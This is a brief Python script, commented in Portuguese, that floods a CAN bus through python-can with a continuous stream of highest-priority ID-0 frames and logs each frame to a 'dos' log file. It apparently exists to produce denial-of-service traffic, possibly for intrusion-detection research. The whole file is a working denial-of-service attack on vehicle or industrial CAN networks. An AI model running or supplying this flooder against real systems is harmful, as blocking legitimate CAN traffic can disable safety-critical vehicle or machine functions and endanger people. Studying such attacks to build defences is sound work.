import can
import time
import random
import datetime
import logging

logging.basicConfig(filename=f"dos-{datetime.datetime.now()}.log", level=logging.INFO, format='%(message)s')

def createLogLine(msg):
    payload = "".join(["{:02X}".format(byte) for byte in msg.data])
    logging.info(f'({msg.timestamp}) {msg.channel} {hex(msg.arbitration_id)}#{payload}')

# Configuração da interface CAN (can0 = exemplo)
bus = can.interface.Bus(channel='can0', bustype='socketcan')

try:
    start_time = time.time()
    while True:   
        message = can.Message(arbitration_id=0, timestamp=0, data = None, is_extended_id=False)
        # Envie a mensagem fabricada para o barramento CAN
        bus.send(message)
        
        print(message)
        createLogLine(message)

        # Não dá para mandar tantas mensagens para o DoS ter efeito
        time.sleep(0.00001)  # Intervalo entre cada mensagem (em segundos)


except KeyboardInterrupt:
    pass

# Limpeza da interface CAN
bus.shutdown()
